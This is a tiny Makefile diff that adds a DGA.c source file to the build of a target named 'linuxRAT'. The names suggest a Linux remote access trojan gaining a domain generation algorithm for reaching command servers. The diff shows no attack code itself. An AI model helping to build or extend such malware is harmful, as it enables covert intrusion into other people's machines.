@@ -4,7 +4,7 @@ CFLAGS = -Wall -g
 
 TARGET = ../Out/linuxRAT
 
-SOURCES = Main.c File.c Dir.c Disconnect.c
+SOURCES = Main.c File.c Dir.c Disconnect.c DGA.c
 
 OBJECTS = $(SOURCES:.c=.o)
 
